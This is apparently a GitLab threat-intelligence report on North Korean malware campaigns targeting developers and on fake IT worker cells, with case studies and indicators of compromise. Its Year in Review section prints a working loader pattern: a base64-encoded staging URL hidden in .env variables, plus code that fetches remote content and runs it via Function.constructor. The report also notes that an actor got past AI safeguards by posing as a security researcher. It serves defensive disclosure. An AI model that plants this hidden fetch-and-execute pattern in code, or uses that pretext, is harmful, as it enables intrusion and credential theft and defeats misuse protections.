---
date: '2026-02-22'
description: GitLab's Threat Intelligence Team has exposed advanced North Korean tradecraft,
  revealing the "Contagious Interview" scheme that entices developers to run malicious
  code under false pretenses. Key findings indicate extensive use of JavaScript malware,
  primarily BeaverTail and Ottercookie, while employing custom concealment techniques
  to evade detection. GitLab's proactive measures led to banning 131 accounts in 2025.
  This highlights the increasing sophistication of state-sponsored cyber operations,
  emphasizing the need for enhanced detection strategies among organizations relying
  on developer platforms to mitigate these emerging threats effectively.
link: https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/
tags:
- Cybersecurity
- North Korea
- Threat Intelligence
- GitLab
- Malware
title: GitLab Threat Intelligence Team reveals North Korean tradecraft
---

GitLab Threat Intelligence Team reveals North Korean tradecraft

Published on: February 19, 2026

96 min read

# GitLab Threat Intelligence Team reveals North Korean tradecraft

Gain threat intelligence about North Korea’s Contagious Interview and fake IT worker campaigns and learn how GitLab disrupted their operations.

![](https://res.cloudinary.com/about-gitlab-com/image/upload/f_auto,q_auto,c_lfill/v1751464282/r2ovpvmizpkcngy9kzqu.png)

![Oliver Smith](https://res.cloudinary.com/about-gitlab-com/image/upload/f_auto,q_auto/v1769722302/juupgr8w0batn0fek4xp.jpg)[Oliver Smith](https://about.gitlab.com/blog/authors/oliver-smith)

[security](https://about.gitlab.com/blog/tags/security/) [security research](https://about.gitlab.com/blog/tags/security-research/)

We’re sharing intelligence on threat actors associated with North Korean Contagious Interview and IT worker campaigns to raise awareness of emerging trends in operations and tradecraft. We hope this analysis helps the broader security community defend against evolving threats and address the industry-wide challenge of threat actors using legitimate platforms and tools for their operations.
Publishing this intelligence reflects our commitment to disrupting threat actor infrastructure. Our security team continuously monitors for accounts that violate our platform’s terms of use and maintains controls designed to prevent the creation of accounts from U.S.-embargoed countries in accordance with applicable trade control laws.

**There is no action needed by GitLab customers and GitLab remains secure.**

## Executive summary

### What is Contagious Interview?

Since at least 2022, North Korean nation-state threat actors have posed as recruiters to induce software developers to execute malicious code projects under the pretense of technical interviews. Malicious projects execute custom malware, allowing threat actors to steal credentials and remotely control devices, enabling financial and identity theft and lateral movement. This malware distribution campaign has impacted thousands of developers and is tracked in industry research as Contagious Interview.

### About the report

In 2025, GitLab identified and banned accounts created by North Korean threat actors used for [Contagious Interview](https://attack.mitre.org/groups/G1052/). GitLab’s visibility into these actors' code repositories provides unique, real-time intelligence into the infrastructure powering campaign activity. In some instances, we can leverage this insight to identify private GitLab.com projects created and used by North Korean nation-state threat actors. Some private projects contain malware development artifacts powering North Korean nation-state malware campaigns. Other projects contain records and notes or software capabilities that support North Korean sanctions evasion and revenue generation through [IT worker activity](https://www.fbi.gov/investigate/cyber/alerts/2025/north-korean-it-worker-threats-to-u-s-businesses).

Exposing this activity discourages future attempts by these actors to create GitLab accounts and offers insights other organizations can use to enhance their own defenses.

This report contains a [Year in Review](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/#year-in-review) summarizing activity from North Korean nation-state actors that used GitLab.com for their operations in 2025, including a campaign-level view into malware infrastructure and technique trends. The report also includes case studies analyzing:

- [Financial records](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/#case-study-1-north-korean-it-worker-cell-manager-financial-and-administrative-records) maintained by the manager of a North Korean IT worker cell, detailing proceeds from 2022 to 2025
- [A synthetic identity creation pipeline](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/#case-study-2-synthetic-identity-creation-and-service-abuse-at-scale) used to create at least 135 personas, automated to generate professional connections and contact leads at scale
- [A North Korean IT worker controlling 21 unique personas](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/#case-study-3-north-korean-operator-controlling-21-personas) and adding their own image to stolen U.S. identity documents
- [A North Korean IT worker recruiting facilitators](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/#case-study-4-north-korean-fake-it-worker-operating-from-central-moscow) and working for U.S. organizations while operating from Moscow, Russia

We’re also sharing more than 600 indicators of compromise associated with these case studies, which can be found in the [Appendix](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/#appendix-2-indicators-of-compromise).

## Year in Review

North Korean nation-state malware activity accelerated in the second half of 2025 and peaked in September. We banned an average of 11 accounts per month for distributing North Korean nation-state malware or loaders. We assess that North Korean nation-state malware activity on GitLab.com almost certainly relates to distinct teams operating in parallel based on branching distribution and obfuscation techniques, infrastructure, and malware variants.

### Key findings

Here are our key findings, including 2025 campaign trends and malicious code project features.

#### 2025 campaign trends

In 2025, we banned 131 unique accounts distributing malicious code projects we attribute to North Korean nation-state threat actors. We identified malicious projects through a combination of proactive detection and user reports. In every instance, threat actors used primarily JavaScript codebases. Malicious repositories executed JavaScript-based malware families tracked publicly as BeaverTail and Ottercookie in more than 95% of cases, however we also observed the distribution of lower prevalence payloads, including the compiled ClickFix BeaverTail variant [we identified](https://gitlab-com.gitlab.io/gl-security/security-tech-notes/threat-intelligence-tech-notes/north-korean-malware-sept-2025/) in September.

Threat actors typically originated from consumer VPNs when interacting with GitLab.com to distribute malware; however they also intermittently originated from dedicated VPS infrastructure and likely laptop farm IP addresses. Threat actors created accounts using Gmail email addresses in almost 90% of cases. We observed custom email domains in only five cases, all relating to organizations we assess are likely front companies controlled by North Korean threat actors. Based on project composition, threat actors most commonly targeted developers seeking employment in the cryptocurrency, finance, and real estate sectors. Threat actors also targeted developers in sectors, including artificial intelligence and gaming, at a low rate.

In more than 80% of instances, threat actors did not store malware payloads on GitLab.com, instead storing a concealed loader intended to source and execute remote content. Threat actors abused at least six legitimate services to host malware payloads, most commonly Vercel. Threat actors also used custom domains to host malware payloads at least 10 times in 2025.

![Distribution of staging infrastructure used in North Korean nation-state malware activity on GitLab.com in 2025.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769690321/kgjafjsrhpczu00fjdwb.png)_Distribution of staging infrastructure used in North Korean nation-state malware activity on GitLab.com in 2025._

We observed diverse project structures and a gradual evolution of concealment techniques through 2025. In nine instances, threat actors used malicious NPM dependencies created immediately prior to their use in malicious projects. In December, we observed a cluster of projects executing malware via VS Code tasks, either piping remote content to a native shell or executing a custom script to decode malware from binary data in a fake font file.

![Distribution of features in North Korean nation-state malware projects activity on GitLab.com in 2025.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769690321/p2gpkuvise7ftc5lr7pv.png)_Distribution of features in North Korean nation-state malware projects activity on GitLab.com in 2025._

#### Malicious code project features

The most common execution pattern we observed in 2025 had the following features:

- A base64 encoded next-stage URL, header key, and header value, all masquerading as benign variables in a .env file.
- A trigger function intended to source remote content and raise an error.
- A global invocation of the trigger function in a file executed as soon as the project is run.
- A custom error handler intended to execute remote content from the trigger function by using `Function.constructor` to load a string as executable code.

**Example excerpt from a .env file containing malicious encoded variables:**

Copy

```ini
      # Runtime Configuration
RUNTIME_CONFIG_API_KEY=aHR0cHM6Ly9hcGktc2VydmVyLW1vY2hhLnZlcmNlbC5hcHAvYXBpL2lwY2hlY2stZW5jcnlwdGVkLzgyMw
RUNTIME_CONFIG_ACCESS_KEY=eC1zZWNyZXQtaGVhZGVy
RUNTIME_CONFIG_ACCESS_VALUE=c2VjcmV0


```

**Decoded values from the .env file (defanged):**

Copy

```pgsql
      # Runtime Configuration
RUNTIME_CONFIG_API_KEY=hxxps[:]//api-server-mocha.vercel[.]app/api/ipcheck-encrypted/823
RUNTIME_CONFIG_ACCESS_KEY=x-secret-header
RUNTIME_CONFIG_ACCESS_VALUE=secret


```

**Example trigger function intended to source remote content from the concealed staging URL and trigger the custom error handler:**

Copy

```javascript
      const errorTimeHandler = async () => {
  try {
    const src = atob(process.env.RUNTIME_CONFIG_API_KEY);
    const k = atob(process.env.RUNTIME_CONFIG_ACCESS_KEY);
    const v = atob(process.env.RUNTIME_CONFIG_ACCESS_VALUE);
    try {
      globalConfig = (await axios.get(`${src}`, {
        headers: {
          [k]: v
        }
      }));
      log('Runtime config loaded successfully.');
    } catch (error) {
      errorHandler(error.response?.data || error.message);
    }
  } catch (err) {
    await errorHandler(err.response?.data || err.message || err);
  }
};


```

**Example custom error handler intended to execute remote code:**

Copy

```javascript
      const errorHandler = (error) => {
  try {
    if (typeof error !== 'string') {
      sss
      console.error('Invalid error format. Expected a string.');
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new(Function.constructor)('require', errCode);
        return handler;
      } catch (e) {
        console.error('Failed:', e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error('Handler function is not available.');
    }
  } catch (globalError) {
    console.error('Unexpected error inside errorHandler:', globalError.message);
  }
};


```

The error handler execution pattern allows threat actors to spread malicious components across up to four files and follows a code path targets may miss even if they audit code before running it. Staging URLs commonly respond with decoy content unless the correct header values are included with requests. This technique became increasingly common through 2025, alongside other anti-analysis developments, including sandbox detection in Ottercookie and the increasing use of invite-only private projects.

The extent to which distinctive subgroups of activity overlap in time leads us to assess that North Korean nation-state malware distribution on GitLab.com almost certainly relates to distinct teams operating in parallel with limited coordination. We’ve observed instances consistent with individual operators independently trying to fix an execution issue or add a feature to their malware. We also observed instances where threat actors have more than one malware execution pathway in a malicious repository, potentially resulting in malware executing twice or more. These instances suggest low technical proficiency among some operators, who appear to lack confidence when modifying malware code.

#### Other notable observations

In July 2025, we identified a project containing notes kept by a North Korean nation-state malware distributor. The threat actor maintained a target list containing more than 1,000 individuals' names. Comments added by the threat actor identify 209 individuals having responded to contact attempts, 88 of whom were recorded as having executed a malicious project. This operator also maintained documents and code related to contract software development, suggesting simultaneous engagement in both malware distribution and fraudulent employment.

In September 2025, we observed a North Korean nation-state malware developer using AI to help develop a custom obfuscator for BeaverTail. Based on commit messages and project data, the developer used ChatGPT and Cursor (with an unknown model) to refine their obfuscator by testing whether AI was capable of de-obfuscating their code. Based on AI model responses, the threat actor was able to avoid triggering safeguards by posing as a security researcher attempting to analyze the malware. This demonstrates the broadly empowering nature of AI and the limits of safeguards in preventing use by motivated threat actors. We have not observed the BeaverTail variant the threat actor created in the wild.

In October 2025, a North Korean nation-state-controlled account submitted a support ticket to appeal a ban from GitLab.com for malware distribution. The threat actor, posing as the CTO of a newly created cryptocurrency organization, inquired about the reason for their ban and requested account reinstatement. We assess that this support ticket was likely an attempt to gather information about our detection methodology. We provided no information to the threat actor and also banned a subsequent account they created using the same CTO persona.

### Implications

North Korean nation-state malware operations are atypical because of how much direct human effort is involved. The volume of manual effort by many operators presents a challenge to service providers because of the extreme diversity in techniques that emerges.

We observed an increasing emphasis on obfuscation and evasiveness in the second half of 2025, indicating that service provider disruptions are forcing an evolution in tactics. Despite this, we anticipate that North Korean nation-state malware campaigns will continue through 2026 due to the continued effectiveness of the campaign and the high value of developer endpoints to North Korean threat actors.

### Mitigation

We banned 131 accounts associated with North Korean nation-state malware distribution in 2025. We’re grateful for the abuse reports we received from GitLab.com users, which helped us to track threat actors through infrastructure and technique shifts. We encourage GitLab.com users encountering malicious or suspicious content to continue to submit abuse reports using the abuse report functionality on user profile pages.

We improved our data collection and clustering of North Korean nation-state accounts and invested in new capabilities to identify threat actor infrastructure. We collaborated with industry partners to share our data, enabling the disruption of accounts on other platforms.

## Case studies

### Case Study 1: North Korean IT Worker Cell Manager Financial and Administrative Records

#### Summary

We identified a private project almost certainly controlled by Kil-Nam Kang (강길남), a North Korean national managing a North Korean IT worker cell. Kang maintained detailed financial and personnel records showing earnings of more than US$1.64 million between Q1 2022 and Q3 2025. Kang’s cell currently includes seven other North Korean nationals and generates revenue through freelance software development under false identities. We assess that the cell is highly likely colocated and operating from Beijing, China.

#### Key findings

In late 2025, we identified a private project containing financial records and administrative documents related to the operation of a North Korean IT worker cell. Detailed financial records span from Q1 2022 to Q3 2025, however less detailed records indicate the cell was operating as early as 2019.

We assess that the project is almost certainly controlled by North Korean national Kil-Nam Kang. Records indicate that Kang managed the cell as two subteams in 2022, however from 2023 onwards only tracked performance at the individual level. Kang maintains detailed personnel records, including dossiers on each team member, performance reviews, and copies of team members’ passports. Kang also has credentials to remotely access each cell member's workstation.

![Assessed organization chart of the North Korean IT worker cell managed by Kil-Nam Kang.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769692342/zasqtzdr3xpq9wgqh6a1.png)_Assessed organization chart of the North Korean IT worker cell managed by Kil-Nam Kang._

Personnel dossiers list each of the cell members as “베이징주재 김일성종합대학 공동연구중심 연구사”, translating to “Researcher at Kim Il-sung University Joint Research Center in Beijing”. This designation suggests that the cell’s presence in China may be under an academic pretext. Kang generally accessed GitLab.com via Astrill VPN, however we also observed origination from China Unicom IP addresses geolocated to Beijing, most recently `111.197.183.74`.

Dossiers list devices and accounts owned by each cell member, including passwords to access accounts. Dossiers list from two to four “대방관계” (“bilateral relations”) for each cell member. We assess that these bilateral relations almost certainly include active facilitators, however may also include inadvertent facilitators or victims of identity theft. Bilateral relations span countries including the U.S., Canada, Mexico, Panama, the U.K., France, Spain, Sweden, Montenegro, Russia, China, Thailand, Indonesia, Malaysia, Philippines, Sri Lanka, Argentina, Chile, and Peru. The project contains other data on bilateral relations, including identity documents, banking information, and credentials to remotely access devices and accounts.

Financial records indicate that the cell generates revenue through freelance and contract software development services. The cell maintains detailed notes linking each software development project to a facilitator persona. These notes include samples of communication styles and notes on facilitator circumstances and temperaments to enable cell members to switch between projects if required. The cell focused on web and mobile app development.

Software development clients pay the cell via digital payment processors. Withdrawal receipts indicate that cell members withdraw funds from payment platforms into Chinese banks. The cell maintained organized banking records, including digital images of Chinese Resident Identity Cards, which are required to access the Chinese financial system. The cell maintained individual records for at least three Chinese banks. One Chinese Resident Identity Card relates to a North Korean national who is not a member of the cell.

![Screenshot of project spreadsheet showing deposits and withdrawal from virtual bank accounts, dated November 2025. Client & financial organization names redacted.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769692489/zetnsj3ufqqnlefbpwk0.png)_Screenshot of project spreadsheet showing deposits and withdrawal from virtual bank accounts, dated November 2025. Client & financial organization names redacted._

![Screenshot of spreadsheet tracking withdrawals from digital payment processors to Chinese bank accounts.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769692675/ghr0pg1hrtu109hk2xes.png)_Screenshot of spreadsheet tracking withdrawals from digital payment processors to Chinese bank accounts._

The project contained more than 120 spreadsheets, presentations, and documents that systematically track quarterly income performance for individual team members. Reports compare team member earnings against predefined targets and quarter-over-quarter performance. The comprehensiveness and highly structured nature of financial reports is indicative of regular financial monitoring and reporting to leadership.

![Screenshot of presentation showing cell performance data for Q3 2025.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769692846/kepq0zhevybpfrdnkg3t.png)_Screenshot of presentation showing cell performance data for Q3 2025._

![Screenshot of presentation showing cell member performance relative to goals for Q3 2025.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769692964/mwsgg1hs3zqgddibaxsy.png)_Screenshot of presentation showing cell member performance relative to goals for Q3 2025._

![Screenshot of presentation showing cell performance data by month for Q3 2025.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769693162/eilplgjpnrlh1mln1l67.png)_Screenshot of presentation showing cell performance data by month for Q3 2025._

We aggregated financial data and identified a total reported income of US$1.64 million from Q1 2022 to Q3 2025. The cell had a target of US$1.88 million over the same period. The cell averaged approximately US$117,000 per quarter, approximately US$14,000 per member excluding Kang. The cell produced the highest earnings in the first half of 2022 and lowest earnings in Q3 2025.

![Actual and target cell earnings over time, 2022 to 2025.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769693321/e4okiye7ucr0gge28wle.png)_Actual and target cell earnings over time, 2022 to 2025._

We assess that cell income goals were likely set based on a combination of prior earnings and cell membership. In Q3 2025, cell member Won-Jin Kim was dropped from tracking and his documentation was shifted to a directory marked “귀국” (“Return to the home country”). We assess that Won-Jin Kim’s departure from the cell is unlikely to relate to revenue generation performance based on consistently high earnings relative to other members.

The private project also contained performance reviews for cell members, dated 2020. These performance reviews confirm that the cell is physically colocated and include commentary about cell members’:

- Earnings contribution and mutual skills development.
- Voluntary donations for Typhoon Bavi and COVID-19 recovery in North Korea.
- Contributions to collective household duties, including doing laundry, providing haircuts, and purchasing shared food and drink.
- Interpersonal values and adherence to party values.

These reviews suggest that the cell operates as a tightly controlled collective household where individual performance encompasses both revenue generation and ideological conformity. We observed instances of a cell member communicating with an unknown party by continually overwriting an HTML comment hidden in a large decoy codebase. The other party appeared to be able to communicate with North Korea, and provided the cell member with information about personal matters and the international movements of mutual contacts. This communication method was unique to this exchange and may have been an attempt by the cell member to evade surveillance by their superiors.

![Commit showing a cell member communicating with an unknown party to pass on messages from inside North Korea.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769694080/cxenda3rxohgwbbrddz2.png)_Commit showing a cell member communicating with an unknown party to pass on messages from inside North Korea._

#### Implications

This activity provides a unique view into the financial operations and organizational structure of a North Korean IT worker cell. Records demonstrate that these operations function as structured enterprises with defined targets and operating procedures and close hierarchical oversight. This cell’s demonstrated ability to cultivate facilitators globally provides a high degree of operational resiliency and money laundering flexibility.

The declining earnings trend through 2025 may reflect a changing landscape due to increased public awareness of North Korean IT worker activities. Despite this decline, the cell had earnings exceeding US$11,000 per member in Q3 2025, demonstrating a clear capability to generate funds for the regime.

#### Mitigations

We banned accounts related to this activity.

### Case Study 2: Synthetic Identity Creation and Service Abuse at Scale

#### Summary

We identified a North Korean nation-state software development team collaborating on a large-scale synthetic identity creation capability. The capability included functionality to scrape images and personal data, generate fake passports, and automate email and professional networking accounts to generate leads. The threat actors also developed tools to synchronize Git repositories and created copies of proprietary code they gained access to. This activity cluster created a minimum of 135 synthetic identities purporting to originate from Eastern Europe and Southeast Asia. Using these personas, the actor gained access to at least 48 private codebases.

#### Key findings

We identified a set of projects contributed to by a North Korean nation-state activity cluster focused on capability development and large scale synthetic identity creation. The cluster included 10 distinct GitLab accounts or Git identities that exhibited concurrent activity or had distinct origins, leading us to assess that the activity cluster highly likely comprised at least a small team of developers. Accounts commonly originated from Virtual Private Servers but intermittently originated from Russian IP space. The development team commenced activities in 2021 but was most active from late-2024 to mid-2025.

The threat actor developed a complex multistage process to generate synthetic identities at scale. The overall flow of the threat actor’s identity creation capability was to:

1. Scrape photographs from social media, AI image generators, and other platforms.
2. Use the legitimate faceswapper.ai service to create novel images by swapping faces from diverse source images into headshot-style images suitable for identity documents.
3. Generate passports with fake personal information using VerifTools and newly created headshots. VerifTools is an illicit fraudulent identity document service [disrupted by U.S. authorities in August 2025](https://www.justice.gov/usao-nm/pr/us-government-seizes-online-marketplaces-selling-fraudulent-identity-documents-used). Downloaded passports contained watermarks because the threat actor did not pay for VerifTools.
4. Use an automated Adobe Photoshop routine stored in a .atn file to extract and remove VerifTools watermarks.
5. Create accounts on email and professional networking sites. The threat actor used fake passports to seek enhanced identity verification on professional networking sites.

The threat actor’s tooling to interact with abused services was brokered through a control node hosted at `185.92.220.208`. This control node served a custom API that allowed individual operators to remotely create, monitor, and control individual accounts. The threat actor used web browsers instrumented with Selenium to interact with abused services. The threat actor primarily automated accounts to make connections and cold contact leads to generate software engineering work.

The threat actor used a combination of dedicated, IPRoyal, and open proxies to obfuscate their activities and stored a massive volume of solutions to animal/object matching CAPTCHA challenges to facilitate bypasses in automated scripts. The control node tracked the efficacy of the threat actor’s accounts, contact scripts, and infrastructure, allowing the threat actor to monitor campaign effectiveness and adapt its techniques over time through an administrative dashboard.

The threat actor stored working data on dedicated infrastructure or in cloud storage accounts rather than on GitLab.com. However, in September 2024, the threat actor inadvertently committed a dump of its database to GitLab.com. The database contained records of profiles controlled at that time, which was early in the development of the capability. The contents of some fields in the database were encrypted, however the server-side decryption routine code stored on GitLab.com contained a hard-coded key, allowing us to decrypt the data.

As of September 2024, the threat actor controlled 135 synthetic identities. Identities most commonly purported to be based in Serbia, but also purportedly originated from Poland, Philippines, Indonesia, Bulgaria, Croatia, Romania, Lithuania, Moldova, Hungary, and Slovakia. For each account, the threat actor stored information about whether identity verification was successful, with overall results indicating the threat actor was successful in just over 40% of verification attempts. Commit volume on the synthetic identity capability escalated sharply from September 2024 to December 2024, indicating that the true scale of the threat actor’s activities may have been much higher. The threat actor also had more than 73,000 leads stored in its database dump, providing insight into the scope of its outbound activities.

![Distribution of purported account origins](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769694425/igefe8soxgg1gt2lfasy.png)

![Distribution of identity verification results](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769694350/liucfviexwkxy028ysyf.png)

The threat actor also created a set of command line tools for standardized Git operations. The tooling was primarily intended to allow the threat actor to mirror Git repositories from private namespaces on a range of cloud and self-managed source code management systems. The tooling allowed the threat actor to push commits to the mirror and then have them synchronized to remote repositories under the correct Git identities. This capability gave the threat actor a safety net against making commits under the wrong identity and also meant that they exfiltrated copies of codebases they gained access to. Based on metadata reports committed to GitLab.com by the threat actor, they used this mirroring tooling on at least 48 unique repositories.

#### Implications

This cluster is notable among North Korean nation-state activity we observed in 2025 due to the strong focus on automation and continued efficacy monitoring. This cluster also demonstrates that North Korean nation-state threat actors draw on both emerging AI capabilities and the cybercrime ecosystem to enhance their operations.

Identity development is a fundamental element of North Korean nation-state insider activity. North Korean nation-state threat actors incrementally build legitimacy through identities spanning multiple platforms and by seeking enhanced verification services where possible. North Korean nation-state identity cultivation draws on network effects by creating interactions, reviews and testimonials between personas. These tactics have the drawback of increasing threat actors’ exposure to service provider takedowns. Organizations should treat applications with dead links to professional profiles and source code portfolios as highly suspicious.

#### Mitigations

We banned the accounts associated with this activity and notified impacted service providers of potential abuse of their platforms.

### Case Study 3: North Korean Operator Controlling 21 Personas

#### Summary

We identified an individual North Korean operator controlling at least 21 distinct personas based on real identities. The threat actor was focused on revenue generation through contract and freelance software development. The threat actor’s personas spanned five countries and were supported by doctored identity documents and personal information obtained from open sources and through a likely cyber intrusion.

#### Key findings

We identified a code project used by an individual North Korean operator active from at least May 2021 until February 2025. The threat actor was focused on generating revenue through contract and freelance software development under a range of stolen or shared identities, spanning at least 21 distinct personas. The threat actor focused on web, blockchain, and cloud skill sets, and created blogs and professional social media accounts on various external platforms. The threat actor typically accessed GitLab.com via commercial VPNs and Virtual Private Servers with RDP enabled. Based on lapses in proxy use, the threat actor was likely physically located in Russia during early 2025.

The threat actor maintained individual directories for each identity, containing identity documents, resumes, signatures, personal information, and payment card information. The threat actor’s identities spanned the U.S., Canada, Ukraine, Estonia, and Macedonia. For five of their eight U.S.-based identities, the threat actor used Photoshop to edit their own image into one or more stolen identity documents, preserving otherwise valid details. The threat actor produced false Florida and Texas driver licenses and false U.S. passports. The threat actor had Photoshop Document (PSD) template files to produce identity documents for Australia, Austria, Canada, Finland, Germany, Malaysia, Mexico, Philippines, and Poland. We identified some of these template files for sale via illicit services online and assess that the threat actor likely purchased the templates.

![Doctored U.S. identity documents containing the threat actor’s photograph.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769694685/rof3zsajd7asn8lcq0oc.png)_Doctored U.S. identity documents containing the threat actor’s photograph._

The threat actor also collected personal information on U.S.-based individuals. The threat actor had files that appear to have been exported from the HR management system of a large U.S.-based hospitality company. The files contained information including personal and contact details, protected class status, and identity document numbers for almost 8,000 employees of the organization. We were unable to locate this data in circulation or data breach aggregators, suggesting that the data may have been obtained by the threat actor during an intrusion or purchased in a one-off sale. The threat actor also had an export of the public Florida voter registration database, which is one of the most detailed publicly available voter databases.

#### Implications

This threat actor’s activities suggest that North Korean threat actors place a particular value on U.S. identities. We identified no evidence that the threat actor altered non-U.S. identity documents or collected personal data from any other country. This activity also demonstrates that North Korean threat actors, even when focused on earning wages, present a cyber intrusion risk and actively leverage the cybercrime ecosystem to support their operations.

#### Mitigation

We banned the account associated with this operator.

### Case Study 4: North Korean Fake IT Worker Operating from Central Moscow

#### Summary

We identified a private code repository used by a North Korean fake IT worker likely operating from central Moscow. The threat actor was focused on cultivation of a smaller group of more detailed personas and progressed from freelance work to full-time employment. The threat actor also attempted to recruit remote facilitators to maintain custody of laptops intended to be remotely accessed.

#### Key findings

We identified a private code project controlled by a North Korean fake IT worker most recently active in December 2025. We identified the project within a week of its creation, however the threat actor's records indicate they have been active on other platforms since at least 2022. The threat actor started as a freelance software developer and 3D modeler but shifted focus to seeking fraudulent full-time employment in 2025. The threat actor’s strategy relied on a smaller number of personas with emphasis on establishing legitimacy through backstopping rather than relying on many disposable personas.

Repository contents indicate that the threat actor began as a fraudulent freelancer. Invoices created by the threat actor during this period were marked payable to individuals and addresses in China, Poland, and Spain. Documents stored by the threat actor indicate that they rotated through accounts on at least three payment processors to receive payments from clients. A spreadsheet stored by the threat actor indicates they were part of a 14-member cell in 2022, however they did not store continuous financial records on GitLab.com. North Korean cells we have observed on GitLab.com typically have smaller membership and this is the only data we have observed consistent with a cell membership exceeding 10.

In early 2025, the threat actor pivoted to attempting to obtain full-time employment at U.S. and U.K. organizations. In March 2025, the threat actor uploaded chat logs to GitLab.com containing exchanges with another likely North Korean operator. The threat actors discussed their progress in recruiting individuals in the U.S. and U.K. to maintain custody of laptops to be remotely accessed in exchange for a fixed fee and the payment of power and internet utilities. The primary threat actor mentioned having a current facilitator based in Hong Kong providing remote access to a device and sharing their identity and a potential facilitator in the U.K. The primary threat actor represented himself as a Chinese national with visa difficulties when attempting to recruit facilitators.

In April 2025, the threat actor operationalized the Hong Kong-based facilitator and started seeking employment. The threat actor circulated a set of resumes with different skill sets on resume-sharing sites and on a personal portfolio website. The threat actor took a series of photographs of themselves and used several AI-headshot services to create professional profile photos.

![Original and AI-enhanced images of the threat actor stored in private projects and open-source examples claiming employment at two U.S.-based organizations.](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769694925/spifmjjmsbod8nczsi6n.png)_Original and AI-enhanced images of the threat actor stored in private projects and open-source examples claiming employment at two U.S.-based organizations._

The threat actor uploaded the original images used to create their AI headshots to GitLab.com. The images contained EXIF metadata, including GPS coordinate data. GPS coordinates stored on the images indicate that they were taken at `55°43'44.4"N 37°36'55.8"E`, which is a location in the Yakimanka District in central Moscow. We note that these coordinates were highly likely produced via Windows location services based on WiFi positioning and may have a reduced accuracy compared to true GPS. Despite this limitation, we assess that it is highly likely that this threat actor was based in Moscow when the images were captured on April 18, 2025. The threat actor also commonly originated from Russian IP addresses when accessing GitLab.com without a VPN.

![Map depicting the location stored in EXIF metadata on images of the threat actor. ](https://res.cloudinary.com/about-gitlab-com/image/upload/v1769695036/cjv9evwdxwxonpdgvko9.png)_Map depicting the location stored in EXIF metadata on images of the threat actor._

The threat actor’s notes indicate that they gained employment with at least one small U.S.-based technology agency in mid-2025 and were subsequently contracted to five other organizations. The threat actor appears to have gained significant access to the agency, including privileged access to web hosts used for client projects and potential access to an executive’s Slack account. The threat actor stored copies of the executive’s resume and message logs indicating that the threat actor may represent themselves as the executive in communications with external parties. We are unable to assess whether this is an instance of facilitation or the threat actor using their foothold to establish deeper control of the agency.

#### Implications

This incident is an example of a North Korean fake IT worker cultivating a small number of detailed personas. This approach is distinct from other operators that focus on a higher volume of disposable personas.

This incident also provides insight into North Korean facilitator cultivation. The threat actors were content to seek purely technical facilitators rather than facilitators willing to share their identities and participate in meetings. This preference suggests that North Korean operators prioritize circumventing technical controls such as IP address-based geolocation and reputation scoring over identity verification challenges, indicating that technical controls may be a more significant operational barrier in the current landscape.

#### Mitigations

We banned the account associated with this activity.

_Saksham Anand contributed to this report._

## Appendix 1: GitLab Threat Intelligence Estimative Language

We use specific language to convey the estimated probability attached to assessments. We also use words including "possible" and "may" in circumstances where we are unable to provide a specific estimate. Further reading on estimative language is available [here](https://www.cia.gov/resources/csi/static/Words-of-Estimative-Probability.pdf).

| Estimative Term | Almost Certainly Not | Highly Unlikely | Unlikely | Real Chance | Likely | Highly Likely | Almost Certain |
| :-- | :-- | :-- | :-- | :-- | :-- | :-- | :-- |
| Probability Range | 0 - 10% | 10 - 25% | 25 - 40% | 40 - 60% | 60 - 75% | 75 - 90% | 90 - 100% |

## Appendix 2: Indicators of Compromise

We recommend that organizations use these indicators of compromise as a basis for investigation rather than as a blocklist. North Korean threat actors almost certainly use compromised and purchased identities to support their operations, meaning these indicators of compromise may not be uniquely malicious or may have reverted to their original owners. We have made our best efforts to filter for email addresses where threat actors have indicated positive control of the email address on one or more platforms or represented themselves as the associated identity.

| Indicator | Type | Risk | First Seen | Last Seen | Comment | Case Study |
| :-- | :-- | :-- | :-- | :-- | :-- | :-- |
| `aleks.moleski@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `aleksander.malinowski@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `anatol.baranski@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `anton.plonski@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `ben.moore0622@outlook.com` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `edward.harley@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `iwan.banicki@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `johnwilson0825@outlook.com` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `kevin.brock@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `richard.francis10@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `robert.radwanski@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `roman.bobinski@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
